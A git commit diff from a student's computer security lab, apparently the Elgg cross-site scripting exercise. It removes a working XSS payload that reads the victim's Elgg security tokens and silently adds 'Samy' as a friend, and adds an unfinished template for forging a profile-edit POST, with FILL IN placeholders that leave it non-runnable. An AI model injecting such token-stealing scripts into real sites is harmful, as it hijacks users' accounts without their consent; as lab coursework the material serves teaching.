3456647be612f6e07803f08ffcd8593b6bea07d4
AbdurRahmanFahad <1605069@ugrad.cse.buet.ac.bd>
2021-06-21 03:15:07 +0600

    task 2 started

--- Computer Security/offline 2/scripts/1605069_Task_2.js
+++ Computer Security/offline 2/scripts/1605069_Task_2.js
@@ -1,27 +1,28 @@
 <script type="text/javascript">
-    window.onload = function () {
-	var Ajax=null;
-    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    window.onload = function(){
+	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+	//and Security Token __elgg_token
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
     var token="&__elgg_token="+elgg.security.token.__elgg_token;
-    //Construct the HTTP request to add Samy as a friend.
 
-    var url1 = "http://www.xsslabelgg.com/action/friends/add?friend=";
-    var userid = elgg.page_owner.guid;
-    var sendurl = url1 + userid + ts + token + ts + token; //FILL IN
+    //Construct the content of your url.
+    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
+    var content=...; //FILL IN
 
-    // http://www.xsslabelgg.com/action/friends/add?friend=47
-    //&__elgg_ts=1624213273&__elgg_token=3qiQClD2nrEaJRzoSOYKbg&__elgg_ts=1624213273
-    //&__elgg_token=3qiQClD2nrEaJRzoSOYKbg
+    //Referer: http://www.xsslabelgg.com/profile/alice/edit
+    var referer = "http://www.xsslabelgg.com/profile/" + elgg.session.user.name + "/edit";
 
-    //Create and send Ajax request to add friend
-    if(elgg.session.user.guid != userid)
+    if(//Condition to check if the user is not Samy)
     {
-        Ajax = new XMLHttpRequest();
-    Ajax.open("GET",sendurl,true);
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+    Ajax=new XMLHttpRequest();
+    Ajax.open("POST",sendurl,true);
     //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-    //Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-    Ajax.send();	
+    //Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    Ajax.setRequestHeader("Referer",referer);
+
+    Ajax.send(content);
 	}
-	
 	}
 </script>
